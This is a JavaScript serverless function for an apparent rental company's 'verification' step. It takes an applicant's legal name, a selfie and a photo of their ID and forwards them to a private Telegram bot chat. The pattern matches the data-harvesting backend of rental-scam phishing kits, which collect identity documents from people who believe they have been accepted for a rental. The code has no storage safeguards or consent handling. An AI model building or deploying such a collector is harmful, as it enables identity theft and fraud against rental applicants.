// Vercel Function (Node.js runtime) — live at POST /api/verify
// Handles the post-acceptance rental verification submission:
// applicant's legal name, a photo of them, and a photo/scan of their ID.
//
// Uses the same bot token and chat as the application form.
// Paste your real values below (or keep in sync with api/submit.js).

const TELEGRAM_BOT_TOKEN = "PASTE_YOUR_BOT_TOKEN_HERE";
const TELEGRAM_CHAT_ID = "PASTE_YOUR_CHAT_ID_HERE";

export const config = {
  api: {
    bodyParser: {
      sizeLimit: "10mb"
    }
  }
};

function base64ToBlob(dataUrl, fallbackType) {
  const match = /^data:([^;]+);base64,(.*)$/.exec(dataUrl);
  const mimeType = match ? match[1] : fallbackType;
  const base64 = match ? match[2] : dataUrl;
  const buffer = Buffer.from(base64, "base64");
  return { blob: new Blob([buffer], { type: mimeType }), mimeType };
}

async function sendPhotoOrDocument(base, dataUrl, filename, caption) {
  const { blob, mimeType } = base64ToBlob(dataUrl, "image/jpeg");
  const isImage = mimeType.startsWith("image/") && mimeType !== "application/pdf";
  const endpoint = isImage ? "sendPhoto" : "sendDocument";
  const fieldName = isImage ? "photo" : "document";

  const fd = new FormData();
  fd.append("chat_id", TELEGRAM_CHAT_ID);
  fd.append("caption", caption);
  fd.append(fieldName, blob, filename);

  const res = await fetch(`${base}/${endpoint}`, { method: "POST", body: fd });
  if (!res.ok) {
    const detail = await res.text();
    throw new Error(`${endpoint} failed: ${detail}`);
  }
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.status(405).json({ ok: false, error: "Method not allowed" });
    return;
  }

  if (
    !TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.startsWith("PASTE_") ||
    !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID.startsWith("PASTE_")
  ) {
    res.status(500).json({ ok: false, error: "Server not configured" });
    return;
  }

  const body = req.body || {};
  const { fullName, photo, idDocument } = body;

  if (!fullName || typeof fullName !== "string") {
    res.status(400).json({ ok: false, error: "Missing full name" });
    return;
  }
  if (!photo || typeof photo !== "string") {
    res.status(400).json({ ok: false, error: "Missing photo" });
    return;
  }
  if (!idDocument || typeof idDocument !== "string") {
    res.status(400).json({ ok: false, error: "Missing ID document" });
    return;
  }

  const base = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

  try {
    const msgRes = await fetch(`${base}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: `✅ *Rental Verification Submitted — Anthony Properties & Rentals*\n\n*Name (as on ID):* ${fullName}`,
        parse_mode: "Markdown"
      })
    });
    if (!msgRes.ok) {
      const detail = await msgRes.text();
      res.status(502).json({ ok: false, error: "Telegram message failed", detail });
      return;
    }

    await sendPhotoOrDocument(base, photo, "photo.jpg", `Photo — ${fullName}`);
    await sendPhotoOrDocument(base, idDocument, "id.jpg", `ID — ${fullName}`);

    res.status(200).json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: "Unexpected server error", detail: String(err) });
  }
}
